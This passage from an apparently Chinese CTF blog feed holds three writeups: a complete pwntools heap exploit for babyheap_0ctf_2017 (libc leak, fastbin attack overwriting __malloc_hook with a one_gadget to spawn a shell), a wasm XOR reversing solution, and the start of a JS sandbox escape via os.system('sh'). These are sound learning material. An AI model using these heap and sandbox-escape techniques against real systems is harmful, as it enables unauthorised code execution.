    00000040  00 00 11 01  00 00 00 00  00 00 78 db  ea 5b 5c 7f  │····│····│··x·│·<span class="token punctuation">[</span>\·│
    00000050  00 00 78 db  ea 5b 5c 7f  00 00 00 00  00 00 00 00  │··x·│·<span class="token punctuation">[</span>\·│····│····│
    00000060  00 00 00 00  00 00 00 00  00 00 0a 31  2e 20 41 6c  │····│····│···1│. Al│
    00000070  6c 6f 63 61  74 65 0a 32  2e 20 46 69  6c 6c 0a 33  │loca│te·2│. Fi│ll·3│
    00000080  2e 20 46 72  65 65 0a 34  2e 20 44 75  6d 70 0a 35  │. Fr│ee·4│. Du│mp·5│
    00000090  2e 20 45 78  69 74 0a 43  6f 6d 6d 61  6e 64 3a 20  │. Ex│it·C│omma│nd: │
    000000a0
leak:0x7f5c5beadb20
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped process <span class="token string">'./babyheap_0ctf_2017'</span> <span class="token punctuation">(</span>pid 119678<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>可以看到成功打印出main_arena+88地址</p>
<h3 id="获取libc-base"><a href="#获取libc-base" class="headerlink" title="获取libc base"></a>获取libc base</h3><p>利用工具</p>
<p><a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">https://github.com/bash-c/main_arena_offset</a></p>
<p>可以快速获取当前main_arena的offset</p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ main_arena /lib/x86_64-linux-gnu/libc.so.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>libc version <span class="token keyword">:</span> glibc 2.23
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>build ID <span class="token keyword">:</span> BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>1ca54a6e0d76188105b12e49fe6b8019bf08803a
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>main_arena_offset <span class="token keyword">:</span> 0x3c4b20
ios@ubuntu:~/APwn/buuctf$
</code></pre>
<p>从而可以计算出当前libc_base</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span>
<span class="token keyword">print</span> <span class="token string">"leak:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
base<span class="token operator">=</span>leak<span class="token number">-0x3c4b20</span>
</code></pre>
<h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><p>leak出了libc base ，接着通过 改malloc_hook为one_gadget 即可成功getshell</p>
<p>找到malloc_hook 地址，寻找满足fastbin 对齐检查的fake chunk addr ，计算malloc_hook距离该fake chunk addr的offset 。溢出chunk0 修改 chunk1的fd指向该fake chunk addr 多次申请堆块 成功在此处申请到chunk。</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p <span class="token punctuation">(</span>void*<span class="token punctuation">)</span><span class="token operator">&amp;</span>main_arena
<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>void *<span class="token punctuation">)</span> 0x7f406f115b20 <span class="token operator">&lt;</span>main_arena<span class="token operator">></span>
gdb-peda$ x/20gx 0x7f406f115b20-0x10
0x7f406f115b10 <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b20 <span class="token operator">&lt;</span>main_arena<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b30 <span class="token operator">&lt;</span>main_arena+16<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b40 <span class="token operator">&lt;</span>main_arena+32<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b50 <span class="token operator">&lt;</span>main_arena+48<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b60 <span class="token operator">&lt;</span>main_arena+64<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b70 <span class="token operator">&lt;</span>main_arena+80<span class="token operator">></span>:    0x0000000000000000    0x000056350ef5f230
0x7f406f115b80 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>:    0x0000000000000000    0x000056350ef5f0b0
0x7f406f115b90 <span class="token operator">&lt;</span>main_arena+112<span class="token operator">></span>:    0x000056350ef5f0b0    0x00007f406f115b88
0x7f406f115ba0 <span class="token operator">&lt;</span>main_arena+128<span class="token operator">></span>:    0x00007f406f115b88    0x00007f406f115b98
gdb-peda$ find_fake_fast 0x7f406f115b10 0x7f
FAKE CHUNKS
0x7f406f115aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x406f114260000000, 
  size <span class="token operator">=</span> 0x7f, 
  fd <span class="token operator">=</span> 0x406edd6e20000000, 
  bk <span class="token operator">=</span> 0x406edd6a0000007f, 
  fd_nextsize <span class="token operator">=</span> 0x7f, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
gdb-peda$
</code></pre>
<p>计算fake chunk addr 距离malloc_hook 的offset</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/x 0x7f406f115b10-0x7f406f115aed
<span class="token variable">$2</span> <span class="token operator">=</span> 0x23
</code></pre>
<pre class=" language-python"><code class="language-python">malloc_hook<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>获取onegadget</p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  rax <span class="token operator">==</span> NULL

0x4526a execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf02a4 execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x50, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x50<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf1147 execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x70, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x70<span class="token punctuation">]</span> <span class="token operator">==</span> NULL
</code></pre>
<p>利用Fill函数向多次申请后申请到的fake_chunk写入onegadget</p>
<p>因为距离malloc_hook 0x23 所以填充数据 溢出覆盖malloc_hook</p>
<p>再次申请堆块时 会调用malloc_hook </p>
<p>成功getshell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span> 

p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./babyheap_0ctf_2017'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#p =remote('pwn.buuoj.cn',20001)</span>
<span class="token comment" spellcheck="true">#libc=ELF('x64_libc.so.6')</span>
<span class="token keyword">def</span> <span class="token function">Allocate</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Fill</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Dump</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: \n'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=0</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=1</span>
<span class="token comment" spellcheck="true">#sleep(1)</span>
Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=2</span>
Fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=2</span>
Fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
<span class="token keyword">print</span> Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print hexDump(1)[:-8]</span>
leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span>
<span class="token keyword">print</span> <span class="token string">"leak:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>

base<span class="token operator">=</span>leak<span class="token number">-0x3c4b20</span>
malloc_hook<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
Fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx4</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新的开始、只记录遇到题目的问题以及解决方法。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;通过分析源码可以知道&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;
    
    </summary>
    
    
      <category term="Fastbin_Attack" scheme="http://iosmosis.github.io/tags/Fastbin-Attack/"/>
    
      <category term="Heap" scheme="http://iosmosis.github.io/tags/Heap/"/>
    
      <category term="做题笔记" scheme="http://iosmosis.github.io/tags/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>wasm逆向-真的是web</title>
    <link href="http://iosmosis.github.io/2019/07/25/wasm%E9%80%86%E5%90%91-%E7%9C%9F%E7%9A%84%E6%98%AFweb/"/>
    <id>http://iosmosis.github.io/2019/07/25/wasm逆向-真的是web/</id>
    <published>2019-07-25T02:52:55.000Z</published>
    <updated>2019-09-12T04:42:15.521Z</updated>
    
    <content type="html"><![CDATA[<p>拿到题目<br><img src="https://s2.ax1x.com/2019/08/02/ewMcTA.png" alt="ewMcTA.png"></p>
<p>给出三个文件</p>
<p>先进行简单运行测试</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewMyeH.png" alt="ewMyeH.png"></p>
<p>随意输入</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewM2FI.png" alt="ewM2FI.png"></p>
<p>逻辑很清晰</p>
<p>输入flag、 验证、返回是否正确</p>
<p>当然核心逻辑一定在test.wasm文件中</p>
<p>先利用wabt中的wasm2c 将wasm文件反编译成c文件</p>
<pre><code>┌─[ios@iosdeMacBook] - [~/wabt/out/clang/Debug] - [四  7 25, 11:01]
└─[$] &lt;git:(master*)&gt; ./wasm2c test.wasm -o test.c
</code></pre><p>执行完成命令后可以看到文件夹下面生成了一个test.c和一个test.h</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewMrOe.png" alt="ewMrOe.png"><br>接着放在wasm2c目录里进行编译</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewM6wd.png" alt="ewM6wd.png"></p>
<p>进行gcc编译</p>
<pre><code>gcc -g test.c -o test
</code></pre><p>发现会报错</p>
<p>因为很多wasm的函数并没有具体实现  因为我们主要目的是为了方便逆向，方便观察逻辑 所以我们只需要编译不做链接</p>
<pre><code>gcc -c test.c -o test
</code></pre><p>生成了test文件 接着我们拖进ida</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewMSII.png" alt="ewMSII.png"></p>
<pre><code> for ( i = 0; i &lt; (unsigned int)f81(v14); ++i )
  {
    v13 = v14 + i;
    v12 = (char)i32_load8_s(*Z_envZ_memory, v14 + i);
    if ( (signed int)i % 2 == 0 )
      i32_store8((_QWORD *)*Z_envZ_memory, v13, (v12 ^ 0x30) &amp; 0xFF);
    else
      i32_store8((_QWORD *)*Z_envZ_memory, v13, (v12 ^ 0x25) &amp; 0xFF);
  }
</code></pre><p>注意这段代码  </p>
<p>很明显是一段异或操作而且根据循环次数的奇偶做不同的异或。</p>
<p>根据wasm特性 会在底部存储字符串 所以我们可以利用这一特性去查找我们需要的字符串</p>
<pre><code>static const u8 data_segment_data_0[] = {
  0x67, 0x4a, 0x47, 0x7a, 0x69, 0x4a, 0x45, 0x7a, 0x42, 0x40, 0x51, 0x49, 
  0x5c, 0x5c, 0x6f, 0x6e, 0x00, 0x4b, 0x47, 0x7a, 0x67, 0x40, 0x52, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0xc0, 
  0x03, 0x00, 0x00, 0xc0, 0x04, 0x00, 0x00, 0xc0, 0x05, 0x00, 0x00, 0xc0, 
  0x06, 0x00, 0x00, 0xc0, 0x07, 0x00, 0x00, 0xc0, 0x08, 0x00, 0x00, 0xc0, 
  0x09, 0x00, 0x00, 0xc0, 0x0a, 0x00, 0x00, 0xc0, 0x0b, 0x00, 0x00, 0xc0, 
  0x0c, 0x00, 0x00, 0xc0, 0x0d, 0x00, 0x00, 0xc0, 0x0e, 0x00, 0x00, 0xc0, 
  0x0f, 0x00, 0x00, 0xc0, 0x10, 0x00, 0x00, 0xc0, 0x11, 0x00, 0x00, 0xc0, 
};
</code></pre><p>这里截取了最前一部分的字符串 因为直接hex可以看到下部字符串为good wrong 而上部无法解析 根据他主逻辑做了异或操作可以猜测 这些不解析的字符串就是加密后的flag</p>
<p>所以我们写出测试exp</p>
<pre><code>a=[0x67, 0x4a, 0x47, 0x7a, 0x69, 0x4a, 0x45, 0x7a, 0x42, 0x40, 0x51, 0x49, 
  0x5c, 0x5c, 0x6f, 0x6e, 0x00, 0x4b, 0x47, 0x7a, 0x67, 0x40, 0x52,0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0xc0, 
  0x03, 0x00, 0x00, 0xc0, 0x04, 0x00, 0x00, 0xc0, 0x05, 0x00, 0x00, 0xc0, 
  0x06, 0x00, 0x00, 0xc0, 0x07, 0x00, 0x00, 0xc0, 0x08, 0x00, 0x00, 0xc0, 
  0x09, 0x00, 0x00, 0xc0, 0x0a, 0x00, 0x00, 0xc0, 0x0b, 0x00, 0x00, 0xc0, 
  0x0c, 0x00, 0x00, 0xc0, 0x0d, 0x00, 0x00, 0xc0, 0x0e, 0x00, 0x00, 0xc0, 
  0x0f, 0x00, 0x00, 0xc0, 0x10, 0x00, 0x00, 0xc0, 0x11, 0x00, 0x00, 0xc0, 
  0x12, 0x00, 0x00, 0xc0, 0x13, 0x00, 0x00, 0xc0, 0x14, 0x00, 0x00, 0xc0, 
  0x15, 0x00, 0x00, 0xc0, 0x16, 0x00, 0x00, 0xc0, 0x17, 0x00, 0x00, 0xc0, 
  0x18, 0x00, 0x00, 0xc0, 0x19, 0x00, 0x00, 0xc0, 0x1a, 0x00, 0x00, 0xc0, 
  0x1b, 0x00, 0x00, 0xc0, 0x1c, 0x00, 0x00, 0xc0, 0x1d, 0x00, 0x00, 0xc0]
flag=&#39;&#39;
i=0
for i in range(0,55):
      if i%2==0:
          flag+=chr((a[i]^0x30)&amp; 0xFF)
      else:
          flag+=chr((a[i]^0x25)&amp; 0xFF)
print flag
</code></pre><p>运行查看结果</p>
<pre><code>└─[$] &lt;&gt; python was.py                
Wow_You_really_K0nw_Web%0%0%0%0%2%0?3%0?4%0?5%0?6%0?7
</code></pre><p>看到有明文字符串 这肯定就是flag了～</p>
<p>加入flag头提交即可</p>
<p>最后flag{Wow_You_really_K0nw_Web}</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿到题目&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/08/02/ewMcTA.png&quot; alt=&quot;ewMcTA.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;给出三个文件&lt;/p&gt;
&lt;p&gt;先进行简单运行测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2
    
    </summary>
    
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="wasm" scheme="http://iosmosis.github.io/tags/wasm/"/>
    
      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BCTF-2017 Monkey</title>
    <link href="http://iosmosis.github.io/2019/07/19/BCTF-2017-Monkey/"/>
    <id>http://iosmosis.github.io/2019/07/19/BCTF-2017-Monkey/</id>
    <published>2019-07-19T01:44:29.000Z</published>
    <updated>2019-09-12T04:43:31.853Z</updated>
    
    <content type="html"><![CDATA[<p>运行程序 发现是个沙箱</p>
<p>利用dir()查看引用的函数</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">js<span class="token operator">></span> dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
typein<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">1</span> ReferenceError<span class="token punctuation">:</span> dir <span class="token keyword">is</span> <span class="token operator">not</span> defined
Stack<span class="token punctuation">:</span>
  @typein<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">1</span>
js<span class="token operator">></span>
</code></pre>
<p>没办法执行</p>
<p>思路：</p>
<p>如果不能查看调用怎么知道引用os模块了呢？</p>
<p>1.尝试import os</p>
<p>2.假设存在os直接调用</p>
<p>3.假设存在但是过滤.之类的无法直接调用</p>
<p>有了思路就可以开始尝试了</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>js&gt; import os
typein:1:0 SyntaxError: import declarations may only appear at top level of a module:
typein:1:0 import os
typein:1:0
</code></pre><p>SyntaxError：import声明只能出现在模块的顶层</p>
<p>也就是我们没办法在此使用import</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>js&gt; os
({getenv:function getenv() {
    [native code]
}, getpid:function getpid() {
    [native code]
}, system:function system() {
    [native code]
}, spawn:function spawn() {
    [native code]
}, kill:function kill() {
    [native code]
}, waitpid:function waitpid() {
    [native code]
}})
js&gt;
</code></pre><p>当我直接输入os时发现存在以下命令 最值得注意的是system命令 所以我们看看能不能执行os.system(‘sh’)</p>
